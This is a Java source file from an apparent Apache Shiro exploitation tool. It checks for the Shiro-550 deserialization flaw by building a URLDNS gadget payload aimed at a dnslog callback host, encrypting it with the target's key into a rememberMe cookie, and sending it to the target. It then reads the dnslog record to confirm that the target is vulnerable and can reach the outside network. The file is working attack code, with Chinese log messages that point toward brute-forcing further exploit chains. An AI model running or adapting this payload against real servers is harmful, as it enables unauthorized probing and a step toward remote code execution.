package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.gadget.URLDNS;
import com.y5neko.shiroexp.misc.DnslogConfig;
import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import okhttp3.FormBody;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Shiro550VerifyByURLDNS {
    public static void verify(TargetOBJ targetOBJ) throws Exception {
        System.out.println(Log.buffer_logging("INFO", "正在通过URLDNS利用链进行验证"));
        // 处理得到URLDNS的payload字节码
        String verifyRandom = Tools.generateRandomString(8);
        // 获取dnslog平台信息
        System.out.println(Log.buffer_logging("INFO", "正在获取dnslog平台信息"));
        String[] dnslogInfo = DnslogConfig.getDnslogDomain();
        String dnslogBaseURL = dnslogInfo[0];
        System.out.println(Log.buffer_logging("INFO", "dnslog平台地址: https://dnslog.org/"));
        System.out.println(Log.buffer_logging("INFO", "dnslog验证地址: https://" + verifyRandom + "." + dnslogBaseURL));
        System.out.println(Log.buffer_logging("INFO", "dnslog查询Token: " + dnslogInfo[2]));
        System.out.println(Log.buffer_logging("INFO", "dnslog查询Key: " + dnslogInfo[1]));

        byte[] URLDNS_Payload = URLDNS.genPayload("http://" + verifyRandom + "." + dnslogBaseURL);

        // 得到最终rememberMe的值
        String payload = Tools.CBC_Encrypt(targetOBJ.getKey(), Base64.getEncoder().encodeToString(URLDNS_Payload));
//        System.out.println(payload);
        // 在自定义Cookie后添加Cookie字段(cookie;rememberMe=test123)
        Map<String, String> headers = new HashMap<>();
        headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);

        // 发送payload
        HttpRequest.httpRequest(targetOBJ, new FormBody.Builder().build(), headers, targetOBJ.getRequestType());

        // 延时5s进行查询，防止延时误报
        System.out.println(Log.buffer_logging("INFO", "正在验证，延时5秒防止漏报"));
        Thread.sleep(5000);
        String dnslogRecord = DnslogConfig.getDnslogRecord(dnslogInfo);
        if (dnslogRecord.contains(verifyRandom)){
            System.out.println(Log.buffer_logging("SUCC", "验证成功，目标存在Shiro550漏洞且出网"));
            return;
        }
        System.out.println(Log.buffer_logging("FAIL", "验证失败: 目标不存在漏洞或不出网，请手动查询dnslog或直接爆破回显链"));
    }

    public static void main(String[] args) throws Exception {
        verify(new TargetOBJ("http://127.0.0.1:8080"));
    }
}